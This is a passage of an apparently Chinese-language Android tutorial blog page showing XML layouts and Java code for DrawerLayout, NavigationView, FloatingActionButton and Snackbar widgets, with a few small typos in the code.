class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">androidx.drawerlayout.widget.DrawerLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/drawer_layout&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span>   <br>    <span class="hljs-comment">&lt;!-- 滑动界面 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">&quot;left&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;这是菜单！！！&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;30sp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:background</span>=<span class="hljs-string">&quot;#FFF&quot;</span></span><br><span class="hljs-tag">        /&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="NavigationView"><a href="#NavigationView" class="headerlink" title="NavigationView"></a>NavigationView</h2><p>瞬间炸裂运行不了</p><p>贴上代码</p><p>build.gradle(:app)</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">implementation</span> &#x27;androidx.constraintlayout:constraintlayout:<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>&#x27;<br><br><span class="hljs-attribute">implementation</span> &#x27;de.hdodenhof:circleimageview:<span class="hljs-number">3</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>&#x27;<br></code></pre></div></td></tr></table></figure><p>nav_menu.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">menu</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 单项选择 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">group</span> <span class="hljs-attr">android:checkableBehavior</span>=<span class="hljs-string">&quot;single&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">item</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/nov_call&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@drawable/photo2&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:title</span>=<span class="hljs-string">&quot;Call&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">item</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/nov_friendds&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@drawable/tmp_7&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:title</span>=<span class="hljs-string">&quot;Friends&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">item</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/nov_location&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@drawable/photo2&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:title</span>=<span class="hljs-string">&quot;location&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">item</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/nov_mail&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@drawable/photo2&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:title</span>=<span class="hljs-string">&quot;mail&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">item</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/nov_task&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@drawable/photo2&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:title</span>=<span class="hljs-string">&quot;task&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">menu</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>nav_head.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">RelativeLayout</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;100dp&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:padding</span>=<span class="hljs-string">&quot;10dp&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:background</span>=<span class="hljs-string">&quot;@drawable/tmp_20&quot;</span></span><br><span class="hljs-tag">    &gt;</span><br>    <span class="hljs-comment">&lt;!-- 设置图形的圆形处理 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">de.hdodenhof.circleimageview.CircleImageView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/icon_image&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;70dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;70dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:src</span>=<span class="hljs-string">&quot;@drawable/tmp_18&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_centerInParent</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">RelativeLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.drawerlayout.widget.DrawerLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/drawer_layout&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">androidx.appcompat.widget.Toolbar</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/toolbar&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">&quot;@color/purple_700&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/ThemeOverlay.AppCompat.Dark.ActionBar&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">app:popupTheme</span>=<span class="hljs-string">&quot;@style/ThemeOverlay.AppCompat.Light&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;?attr/actionBarSize&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">com.google.android.material.navigation.NavigationView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/nav_view&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">&quot;start&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:menu</span>=<span class="hljs-string">&quot;@menu/nav_menu&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:headerLayout</span>=<span class="hljs-string">&quot;@layout/nav_head&quot;</span></span><br><span class="hljs-tag">        /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.drawerlayout.widget.DrawerLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>Mainactivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.materialtest;<br><br><span class="hljs-keyword">import</span> androidx.annotation.NonNull;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.ActionBar;<br><span class="hljs-keyword">import</span> androidx.appcompat.widget.Toolbar;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> androidx.core.view.GravityCompat;<br><span class="hljs-keyword">import</span> androidx.drawerlayout.widget.DrawerLayout;<br><br><span class="hljs-keyword">import</span> android.os.Build;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.Menu;<br><span class="hljs-keyword">import</span> android.view.MenuItem;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">import</span> com.google.android.material.navigation.NavigationView;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> DrawerLayout mDrawerLayout;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br><br>        Toolbar toolbar=(Toolbar)findViewById(R.id.toolbar);<br>        setSupportActionBar(toolbar);<br>        <br>        mDrawerLayout=(DrawerLayout)findViewById(R.id.drawer_layout);<br>        <span class="hljs-comment">//赋值</span><br>        NavigationView navigationView=(NavigationView)findViewById(R.id.nav_view);<br>        navigationView.setCheckedItem(R.id.nov_call);<br>        navigationView.setNavigationItemSelectedListener(<span class="hljs-keyword">new</span> NavigationView.OnNavigationItemSelectedListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onNavigationItemSelected</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> MenuItem item)</span> </span>&#123;<br>                mDrawerLayout.closeDrawers();<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;);<br><br>        ActionBar actionBar=getSupportActionBar();<br>        <span class="hljs-keyword">if</span>(actionBar!=<span class="hljs-keyword">null</span>)&#123;<br>            actionBar.setDisplayHomeAsUpEnabled(<span class="hljs-keyword">true</span>);<br>            actionBar.setHomeAsUpIndicator(R.drawable.logo);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onCreateOptionsMenu</span><span class="hljs-params">(Menu menu)</span></span>&#123;<br>        getMenuInflater().inflate(R.menu.toolbar,menu);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onOptionsItemSelected</span><span class="hljs-params">(MenuItem item)</span></span>&#123;<br>        <span class="hljs-keyword">switch</span> (item.getItemId())&#123;<br>            <span class="hljs-keyword">case</span> android.R.id.home:<br>                mDrawerLayout.openDrawer(GravityCompat.START);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.backup:<br>                Toast.makeText(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;你点击了返回&quot;</span>,Toast.LENGTH_SHORT).show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.delete:<br>                Toast.makeText(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;你点击了删除&quot;</span>,Toast.LENGTH_SHORT).show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.setting:<br>                Toast.makeText(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;你点击了设置&quot;</span>,Toast.LENGTH_SHORT).show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>        &#125;<br>        <span class="hljs-keyword">return</span>  <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="FloatingActionButton"><a href="#FloatingActionButton" class="headerlink" title="FloatingActionButton"></a>FloatingActionButton</h2><p>在Fragment标签中添加即可</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">com.google.android.material.floatingactionbutton.FloatingActionButton</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/fab&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;80dp&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;80dp&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">&quot;buttom|end&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_margin</span>=<span class="hljs-string">&quot;16dp&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:src</span>=<span class="hljs-string">&quot;@drawable/tmp_5&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.95&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.95&quot;</span> /&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="Snackbar"><a href="#Snackbar" class="headerlink" title="Snackbar"></a>Snackbar</h2><p>MianActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.materialtest_2;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">import</span> com.google.android.material.snackbar.Snackbar;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> Button button=<span class="hljs-keyword">null</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br><br>        button=(Button)findViewById(R.id.delete);<br>        button.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-comment">//柔和性提示 会让用户再次确认</span><br>                Snackbar.make(v,<span class="hljs-string">&quot;即将删除&quot;</span>,Snackbar.LENGTH_LONG).setAction(<span class="hljs-string">&quot;Undo&quot;</span>, <span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                        Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;Data restored&quot;</span>,Toast.LENGTH_SHORT).show();<br>                    &#125;<br>                &#125;).show();<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>activity.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/textView&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;Hello World!&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;40dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toLeftOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toRightOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/delete&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;删除&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;50dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.5&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.8&quot;</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span 